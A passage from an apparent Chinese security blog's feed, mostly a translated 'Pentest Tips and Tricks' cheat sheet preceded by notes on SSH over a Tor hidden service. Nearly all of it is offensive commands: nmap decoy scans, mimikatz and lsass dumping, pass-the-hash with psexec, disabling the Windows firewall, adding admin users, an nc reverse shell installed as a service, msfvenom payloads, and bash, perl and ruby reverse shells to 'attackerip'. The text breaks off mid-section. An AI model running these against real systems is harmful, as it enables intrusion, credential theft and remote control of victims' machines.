class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# install to server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ apt-get install tor torsocks&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# bind ssh to tor service port 80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# /etc/tor/torrc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SocksPolicy accept 127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SocksPolicy accept 192.168.0.0/16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Log notice file /var/log/tor/notices.log&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RunAsDaemon 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;HiddenServiceDir /var/lib/tor/ssh_hidden_service/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;HiddenServicePort 80 127.0.0.1:22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PublishServerDescriptor 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ /etc/init.d/tor start&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ cat /var/lib/tor/ssh_hidden_service/hostname&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3l5zstvt1zk5jhl662.onion&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ssh connect from client&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ apt-get install torsocks&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://airs-sec.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Pentest Tips and Tricks01</title>
    <link href="http://airs-sec.com/2017/06/25/Pentest-Tips-and-Tricks01/"/>
    <id>http://airs-sec.com/2017/06/25/Pentest-Tips-and-Tricks01/</id>
    <published>2017-06-25T09:31:53.000Z</published>
    <updated>2017-06-25T09:49:52.845Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>渗透测试常用技巧和窍门第一部分，来自国外的EK， <a href="https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/#msf-payloads" target="_blank" rel="noopener">看原文的走这</a>。</p></blockquote><h1 id="Pentest-Tips-and-Tricks-01-渗透测试的技巧和窍门"><a href="#Pentest-Tips-and-Tricks-01-渗透测试的技巧和窍门" class="headerlink" title="Pentest Tips and Tricks #01(渗透测试的技巧和窍门)"></a>Pentest Tips and Tricks #01(渗透测试的技巧和窍门)</h1><h2 id="Nmap-Full-Web-Vulnerable-Scan"><a href="#Nmap-Full-Web-Vulnerable-Scan" class="headerlink" title="Nmap Full Web Vulnerable Scan"></a><strong>Nmap Full Web Vulnerable Scan</strong></h2><pre><code>cd /usr/share/nmap/scripts/wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gznmap -sS -sV --script=vulscan/vulscan.nse targetnmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv targetnmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 targetnmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 targetnmap -sV --script=vuln targetnmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target</code></pre><a id="more"></a><h2 id="Dirb-Dir-Bruteforce-目录爆破"><a href="#Dirb-Dir-Bruteforce-目录爆破" class="headerlink" title="Dirb Dir Bruteforce(目录爆破)"></a>Dirb Dir Bruteforce(目录爆破)</h2><pre><code>dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt</code></pre><h2 id="Nikto-web-server-scanner-Niktoweb服务器扫描"><a href="#Nikto-web-server-scanner-Niktoweb服务器扫描" class="headerlink" title="Nikto web server scanner(Niktoweb服务器扫描)"></a>Nikto web server scanner(Niktoweb服务器扫描)</h2><pre><code>nikto -C all -h http://IP</code></pre><h2 id="WordPress-Scanner-wordpress扫描"><a href="#WordPress-Scanner-wordpress扫描" class="headerlink" title="WordPress Scanner(wordpress扫描)"></a>WordPress Scanner(wordpress扫描)</h2><pre><code>git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan./wpscan –url http://IP/ –enumerate p</code></pre><h2 id="HTTP-Fingerprinting-HTTP指纹识别"><a href="#HTTP-Fingerprinting-HTTP指纹识别" class="headerlink" title="HTTP Fingerprinting(HTTP指纹识别)"></a>HTTP Fingerprinting(HTTP指纹识别)</h2><pre><code>wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zipcd httprint_301/linux/./httprint -h http://IP -s signatures.txt</code></pre><h2 id="SKIP-Fish-Scanner"><a href="#SKIP-Fish-Scanner" class="headerlink" title="SKIP Fish Scanner"></a>SKIP Fish Scanner</h2><pre><code>skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP</code></pre><h2 id="Nmap-Ports-Scan"><a href="#Nmap-Ports-Scan" class="headerlink" title="Nmap Ports Scan"></a>Nmap Ports Scan</h2><pre><code>1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)2)fargement3)data packed – like orginal one not scan packet4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target5)nmap –source-port 53 targetnmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)nmap -Pn -T2 -sV –randomize-hosts IP1,IP2nmap –script smb-check-vulns.nse -p445 target (using NSE scripts)nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)nmap -sA -PN -sN targetnmap -sS -sV -T5 -F -A -O target (version detection)nmap -sU -v target (Udp)nmap -sU -P0 (Udp)nmap -sC 192.168.31.10-12 (all scan default)</code></pre><h2 id="NC-Scanning"><a href="#NC-Scanning" class="headerlink" title="NC Scanning"></a>NC Scanning</h2><pre><code>nc -v -w 1 target -z 1-1000for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done</code></pre><h2 id="Unicornscan"><a href="#Unicornscan" class="headerlink" title="Unicornscan"></a>Unicornscan</h2><pre><code>us -H -msf -Iv 192.168.56.101 -p 1-65535us -H -mU -Iv 192.168.56.101 -p 1-65535-H resolve hostnames during the reporting phase-m scan mode (sf - tcp, U - udp)-Iv - verbose</code></pre><h2 id="Xprobe2-OS-fingerprinting-指纹识别"><a href="#Xprobe2-OS-fingerprinting-指纹识别" class="headerlink" title="Xprobe2 OS fingerprinting(指纹识别)"></a>Xprobe2 OS fingerprinting(指纹识别)</h2><pre><code>xprobe2 -v -p tcp:80:open IP</code></pre><h2 id="Samba-Enumeration-samba枚举"><a href="#Samba-Enumeration-samba枚举" class="headerlink" title="Samba Enumeration(samba枚举)"></a>Samba Enumeration(samba枚举)</h2><pre><code>nmblookup -A targetsmbclient //MOUNT/share -I target -Nrpcclient -U &quot;&quot; targetenum4linux target</code></pre><h2 id="SNMP-Enumeration-SNMP枚举"><a href="#SNMP-Enumeration-SNMP枚举" class="headerlink" title="SNMP Enumeration(SNMP枚举)"></a>SNMP Enumeration(SNMP枚举)</h2><pre><code>snmpget -v 1 -c public IPsnmpwalk -v 1 -c public IPsnmpbulkwalk -v2c -c public -Cn0 -Cr10 IP</code></pre><h2 id="Windows-Useful-cmds"><a href="#Windows-Useful-cmds" class="headerlink" title="Windows Useful cmds"></a>Windows Useful cmds</h2><pre><code>net localgroup Usersnet localgroup Administratorssearch dir/s *.docsystem(&quot;start cmd.exe /k $cmd&quot;)sc create microsoft_update binpath=&quot;cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe&quot; start= auto error= ignore/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;Procdump.exe -accepteula -ma lsass.exe lsass.dmpmimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bitsC:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits</code></pre><h2 id="PuTTY-Link-tunnel-putty链接隧道"><a href="#PuTTY-Link-tunnel-putty链接隧道" class="headerlink" title="PuTTY Link tunnel(putty链接隧道)"></a>PuTTY Link tunnel(putty链接隧道)</h2><pre><code>Forward remote port to local addressplink.exe -P 22 -l root -pw &quot;1234&quot; -R 445:127.0.0.1:445 IP</code></pre><h2 id="Meterpreter-portfwd"><a href="#Meterpreter-portfwd" class="headerlink" title="Meterpreter portfwd"></a>Meterpreter portfwd</h2><pre><code># https://www.offensive-security.com/metasploit-unleashed/portfwd/# forward remote port to local addressmeterpreter &gt; portfwd add –l 3389 –p 3389 –r 172.16.194.141kali &gt; rdesktop 127.0.0.1:3389</code></pre><h2 id="Enable-RDP-Access-激活rdp访问"><a href="#Enable-RDP-Access-激活rdp访问" class="headerlink" title="Enable RDP Access(激活rdp访问)"></a>Enable RDP Access(激活rdp访问)</h2><pre><code>reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0netsh firewall set service remoteadmin enablenetsh firewall set service remotedesktop enable</code></pre><h2 id="Turn-Off-Windows-Firewall-关闭windows防火墙"><a href="#Turn-Off-Windows-Firewall-关闭windows防火墙" class="headerlink" title="Turn Off Windows Firewall(关闭windows防火墙)"></a>Turn Off Windows Firewall(关闭windows防火墙)</h2><pre><code>netsh firewall set opmode disable</code></pre><h2 id="Meterpreter-VNC-RDP"><a href="#Meterpreter-VNC-RDP" class="headerlink" title="Meterpreter VNC\RDP"></a>Meterpreter VNC\RDP</h2><pre><code>a# https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/run getgui -u admin -p 1234run vnc -p 5043</code></pre><h2 id="Add-New-user-in-Windows"><a href="#Add-New-user-in-Windows" class="headerlink" title="Add New user in Windows"></a>Add New user in Windows</h2><pre><code>net user test 1234 /addnet localgroup administrators test /add</code></pre><h2 id="Mimikatz-use"><a href="#Mimikatz-use" class="headerlink" title="Mimikatz use"></a>Mimikatz use</h2><pre><code>git clone https://github.com/gentilkiwi/mimikatz.gitprivilege::debugsekurlsa::logonPasswords full</code></pre><h2 id="Passing-the-Hash"><a href="#Passing-the-Hash" class="headerlink" title="Passing the Hash"></a>Passing the Hash</h2><pre><code>git clone https://github.com/byt3bl33d3r/pth-toolkitpth-winexe -U hash //IP cmdorapt-get install freerdp-x11xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IPormeterpreter &gt; run post/windows/gather/hashdumpAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::msf &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586cmsf exploit(psexec) &gt; exploitmeterpreter &gt; shell</code></pre><h2 id="Hashcat-password-cracking"><a href="#Hashcat-password-cracking" class="headerlink" title="Hashcat password cracking"></a>Hashcat password cracking</h2><pre><code>hashcat -m 400 -a 0 hash /root/rockyou.txt</code></pre><p>##　Netcat examples</p><pre><code>c:&gt; nc -l -p 31337#nc 192.168.0.10 31337c:&gt; nc -v -w 30 -p 31337 -l &lt; secret.txt#nc -v -w 2 192.168.0.10 31337 &gt; secret.txt</code></pre><h2 id="Banner-grabbing-with-NC"><a href="#Banner-grabbing-with-NC" class="headerlink" title="Banner grabbing with NC"></a>Banner grabbing with NC</h2><pre><code>nc 192.168.0.10 80GET / HTTP/1.1Host: 192.168.0.10User-Agent: Mozilla/4.0Referrer: www.example.com&lt;enter&gt;&lt;enter&gt;</code></pre><h2 id="Window-reverse-shell"><a href="#Window-reverse-shell" class="headerlink" title="Window reverse shell"></a>Window reverse shell</h2><pre><code>c:&gt;nc -Lp 31337 -vv -e cmd.exenc 192.168.0.10 31337c:&gt;nc example.com 80 -e cmd.exenc -lp 80nc -lp 31337 -e /bin/bashnc 192.168.0.10 31337nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000</code></pre><h2 id="Find-SUID-SGID-root-files"><a href="#Find-SUID-SGID-root-files" class="headerlink" title="Find SUID\SGID root files"></a>Find SUID\SGID root files</h2><pre><code># Find SUID root filesfind / -user root -perm -4000 -print# Find SGID root files:find / -group root -perm -2000 -print# Find SUID and SGID files owned by anyone:find / -perm -4000 -o -perm -2000 -print# Find files that are not owned by any user:find / -nouser -print# Find files that are not owned by any group:find / -nogroup -print# Find symlinks and what they point to:find / -type l -ls</code></pre><h2 id="Python-shell"><a href="#Python-shell" class="headerlink" title="Python shell"></a>Python shell</h2><pre><code>python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><h2 id="Python-Ruby-PHP-HTTP-Server"><a href="#Python-Ruby-PHP-HTTP-Server" class="headerlink" title="Python\Ruby\PHP HTTP Server"></a>Python\Ruby\PHP HTTP Server</h2><pre><code>python2 -m SimpleHTTPServerpython3 -m http.serverruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888, :DocumentRoot =&gt; Dir.pwd).start&quot;php -S 0.0.0.0:8888</code></pre><h2 id="Get-PIDs-of-process"><a href="#Get-PIDs-of-process" class="headerlink" title="Get PIDs of process"></a>Get PIDs of process</h2><pre><code>fuser -nv tcp 80fuser -k -n tcp 80</code></pre><h2 id="Hydra-rdp-Bruteforce"><a href="#Hydra-rdp-Bruteforce" class="headerlink" title="Hydra rdp Bruteforce"></a>Hydra rdp Bruteforce</h2><pre><code>hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp</code></pre><h2 id="Mount-Remote-Windows-Share"><a href="#Mount-Remote-Windows-Share" class="headerlink" title="Mount Remote Windows Share"></a>Mount Remote Windows Share</h2><pre><code>smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw</code></pre><h2 id="Compiling-Exploit-in-Kali-在kali上编译漏洞"><a href="#Compiling-Exploit-in-Kali-在kali上编译漏洞" class="headerlink" title="Compiling Exploit in Kali(在kali上编译漏洞)"></a>Compiling Exploit in Kali(在kali上编译漏洞)</h2><pre><code>gcc -m32 -o output32 hello.c (32 bit)gcc -m64 -o output hello.c (64 bit)</code></pre><h2 id="Compiling-Windows-Exploits-on-Kali-在kali上编译windows漏洞"><a href="#Compiling-Windows-Exploits-on-Kali-在kali上编译windows漏洞" class="headerlink" title="Compiling Windows Exploits on Kali(在kali上编译windows漏洞)"></a>Compiling Windows Exploits on Kali(在kali上编译windows漏洞)</h2><pre><code>wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/downloadwine mingw-get-setup.exeselect mingw32-basecd /root/.wine/drive_c/windowswget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zipcd /root/.wine/drive_c/MinGW/binwine gcc -o ability.exe /tmp/exploit.c -lwsock32wine ability.exe</code></pre><h2 id="NASM-Commands"><a href="#NASM-Commands" class="headerlink" title="NASM Commands"></a>NASM Commands</h2><pre><code>nasm -f bin -o payload.bin payload.asmnasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload</code></pre><h2 id="SSH-Pivoting"><a href="#SSH-Pivoting" class="headerlink" title="SSH Pivoting"></a>SSH Pivoting</h2><pre><code>ssh -D 127.0.0.1:1080 -p 22 user@IPAdd socks4 127.0.0.1 1080 in /etc/proxychains.confproxychains commands target</code></pre><h2 id="SSH-Pivoting-from-One-Network-to-Another"><a href="#SSH-Pivoting-from-One-Network-to-Another" class="headerlink" title="SSH Pivoting from One Network to Another"></a>SSH Pivoting from One Network to Another</h2><pre><code>ssh -D 127.0.0.1:1080 -p 22 user1@IP1Add socks4 127.0.0.1 1080 in /etc/proxychains.confproxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2Add socks4 127.0.0.1 1081 in /etc/proxychains.confproxychains commands target</code></pre><h2 id="Pivoting-Using-metasploit"><a href="#Pivoting-Using-metasploit" class="headerlink" title="Pivoting Using metasploit"></a>Pivoting Using metasploit</h2><pre><code>route add X.X.X.X 255.255.255.0 1use auxiliary/server/socks4arunproxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP Eor# https://www.offensive-security.com/metasploit-unleashed/pivoting/meterpreter &gt; ipconfigIP Address  : 10.1.13.3meterpreter &gt; run autoroute -s 10.1.13.0/24meterpreter &gt; run autoroute -p10.1.13.0          255.255.255.0      Session 1meterpreter &gt; Ctrl+Zmsf auxiliary(tcp) &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set RHOST 10.1.13.2msf exploit(psexec) &gt; exploitmeterpreter &gt; ipconfigIP Address  : 10.1.13.2</code></pre><h2 id="Exploit-DB-search-using-CSV-File"><a href="#Exploit-DB-search-using-CSV-File" class="headerlink" title="Exploit-DB search using CSV File"></a>Exploit-DB search using CSV File</h2><pre><code>git clone https://github.com/offensive-security/exploit-database.gitcd exploit-database./searchsploit –u./searchsploit apache 2.2./searchsploit &quot;Linux Kernel&quot;cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep &quot;&lt;|&lt;=&quot; | sort -k3</code></pre><h2 id="MSF-Payloads"><a href="#MSF-Payloads" class="headerlink" title="MSF Payloads"></a>MSF Payloads</h2><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exemsfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.phpmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.aspmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &quot;\x00&quot; -a x86 --platform win -f c</code></pre><h2 id="MSF-Linux-Reverse-Meterpreter-Binary"><a href="#MSF-Linux-Reverse-Meterpreter-Binary" class="headerlink" title="MSF Linux Reverse Meterpreter Binary"></a>MSF Linux Reverse Meterpreter Binary</h2><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell</code></pre><h2 id="MSF-Reverse-Shell-C-Shellcode"><a href="#MSF-Reverse-Shell-C-Shellcode" class="headerlink" title="MSF Reverse Shell (C Shellcode)"></a>MSF Reverse Shell (C Shellcode)</h2><pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &quot;\x00\x0a\x0d&quot; -a x86 --platform win -f c</code></pre><h2 id="MSF-Reverse-Shell-Python-Script"><a href="#MSF-Reverse-Shell-Python-Script" class="headerlink" title="MSF Reverse Shell Python Script"></a>MSF Reverse Shell Python Script</h2><pre><code>msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py</code></pre><h2 id="MSF-Reverse-ASP-Shell"><a href="#MSF-Reverse-ASP-Shell" class="headerlink" title="MSF Reverse ASP Shell"></a>MSF Reverse ASP Shell</h2><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp</code></pre><h2 id="MSF-Reverse-Bash-Shell"><a href="#MSF-Reverse-Bash-Shell" class="headerlink" title="MSF Reverse Bash Shell"></a>MSF Reverse Bash Shell</h2><pre><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh</code></pre><h2 id="MSF-Reverse-PHP-Shell"><a href="#MSF-Reverse-PHP-Shell" class="headerlink" title="MSF Reverse PHP Shell"></a>MSF Reverse PHP Shell</h2><pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.phpadd &lt;?php at the beginningperl -i~ -0777pe&apos;s/^/&lt;?php \n/&apos; shell.php</code></pre><h2 id="MSF-Reverse-Win-Bin"><a href="#MSF-Reverse-Win-Bin" class="headerlink" title="MSF Reverse Win Bin"></a>MSF Reverse Win Bin</h2><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe</code></pre><h2 id="Linux-Security-Commands"><a href="#Linux-Security-Commands" class="headerlink" title="Linux Security Commands"></a>Linux Security Commands</h2><pre><code># find programs with a set uid bitfind / -uid 0 -perm -4000# find things that are world writablefind / -perm -o=w# find names with dots and spaces, there shouldn’t be anyfind / -name &quot; &quot; -printfind / -name &quot;..&quot; -printfind / -name &quot;. &quot; -printfind / -name &quot; &quot; -print# find files that are not owned by anyonefind / -nouser# look for files that are unlinkedlsof +L1# get information about procceses with open portslsof -i# look for weird things in arparp -a# look at all accounts including ADgetent passwd# look at all groups and membership including ADgetent group# list crontabs for all users including ADfor user in $(getent passwd|cut -f1 -d:); do echo &quot;### Crontabs for $user ####&quot;; crontab -u $user -l; done# generate random passwordscat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&amp;*()_+{}|:&lt;&gt;?=’|fold -w 12| head -n 4# find all immutable files, there should not be anyfind . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‘^….i’# fix immutable fileschattr -i file</code></pre><h2 id="Win-Buffer-Overflow-Exploit-Commands-windows缓冲区溢出漏洞命令"><a href="#Win-Buffer-Overflow-Exploit-Commands-windows缓冲区溢出漏洞命令" class="headerlink" title="Win Buffer Overflow Exploit Commands(windows缓冲区溢出漏洞命令)"></a>Win Buffer Overflow Exploit Commands(windows缓冲区溢出漏洞命令)</h2><pre><code>msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b &quot;\x00&quot; -f cmsfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b &quot;\x00&quot; -f cCOMMONLY USED BAD CHARACTERS:\x00\x0a\x0d\x20                              For http request\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)# Useful Commands:pattern createpattern offset (EIP Address)pattern offset (ESP Address)add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )!pvefindaddr pattern_create 5000!pvefindaddr suggest!pvefindaddr modules!pvefindaddr nosafeseh!mona config -set workingfolder C:\Mona\%p!mona config -get workingfolder!mona mod!mona bytearray -b &quot;\x00\x0a&quot;!mona pc 5000!mona po EIP!mona suggest</code></pre><h2 id="SEH-Structured-Exception-Handling-结构化异常处理"><a href="#SEH-Structured-Exception-Handling-结构化异常处理" class="headerlink" title="SEH - Structured Exception Handling(结构化异常处理)"></a>SEH - Structured Exception Handling(结构化异常处理)</h2><pre><code># https://en.wikipedia.org/wiki/Microsoftspecific_exception_handling_mechanisms#SEH!mona suggest!mona nosafesehnseh=&quot;\xeb\x06\x90\x90&quot; (next seh chain)iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)</code></pre><h2 id="ROP-DEP"><a href="#ROP-DEP" class="headerlink" title="ROP (DEP)"></a>ROP (DEP)</h2><pre><code># https://en.wikipedia.org/wiki/Return-oriented_programming# https://en.wikipedia.org/wiki/Data_Execution_Prevention!mona modules!mona ropfunc -m *.dll -cpb &quot;\x00\x09\x0a&quot;!mona rop -m *.dll -cpb &quot;\x00\x09\x0a&quot; (auto suggest)</code></pre><h2 id="ASLR-Address-space-layout-randomization-ASLR地址空间布局随机化"><a href="#ASLR-Address-space-layout-randomization-ASLR地址空间布局随机化" class="headerlink" title="ASLR - Address space layout randomization(ASLR地址空间布局随机化)"></a>ASLR - Address space layout randomization(ASLR地址空间布局随机化)</h2><pre><code># https://en.wikipedia.org/wiki/Address_space_layout_randomization!mona noaslr</code></pre><h2 id="EGG-Hunter-techniques"><a href="#EGG-Hunter-techniques" class="headerlink" title="EGG Hunter techniques"></a>EGG Hunter techniques</h2><pre><code># https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/# http://www.fuzzysecurity.com/tutorials/expDev/4.html!mona jmp -r esp!mona egg -t lxxl\xeb\xc4 (jump backward -60)buff=lxxllxxl+shell!mona egg -t &apos;w00t&apos;</code></pre><h2 id="GDB-Debugger-Commands"><a href="#GDB-Debugger-Commands" class="headerlink" title="GDB Debugger Commands"></a>GDB Debugger Commands</h2><pre><code># Setting Breakpointbreak *_start# Execute Next Instructionnextstepns# Continue Executioncontinuec# Datachecking &apos;REGISTERS&apos; and &apos;MEMORY&apos;# Display Register Values: (Decimal,Binary,Hex)print /d –&gt; Decimalprint /t –&gt; Binaryprint /x –&gt; HexO/P :(gdb) print /d $eax$17 = 13(gdb) print /t $eax$18 = 1101(gdb) print /x $eax$19 = 0xd(gdb)# Display values of specific memory locationscommand : x/nyz (Examine)n –&gt; Number of fields to display ==&gt;y –&gt; Format for output ==&gt; c (character) , d (decimal) , x (Hexadecimal)z –&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit)</code></pre><h2 id="BASH-Reverse-Shell"><a href="#BASH-Reverse-Shell" class="headerlink" title="BASH Reverse Shell"></a>BASH Reverse Shell</h2><pre><code>bash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1exec /bin/bash 0&amp;0 2&gt;&amp;0exec /bin/bash 0&amp;0 2&gt;&amp;00&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;1960&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; doneexec 5&lt;&gt;/dev/tcp/attackerip/4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1</code></pre><h2 id="PERL-Reverse-Shell"><a href="#PERL-Reverse-Shell" class="headerlink" title="PERL Reverse Shell"></a>PERL Reverse Shell</h2><pre><code>perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;# for win platformperl -MIO -e &apos;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};’</code></pre><h2 id="RUBY-Reverse-Shell"><a href="#RUBY-Reverse-Shell" class="headerlink" title="RUBY Reverse Shell"></a>RUBY Reverse Shell</h2><pre><code>ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&apos;# for win platformruby -rsocket -e &apos;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&apos;ruby -rsocket -e &apos;f=TCPSocket.open(&quot;attackerip&quot;,&quot;443&quot;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</code></pre><h2 id="PYTHON-Reverse-Shell"><a 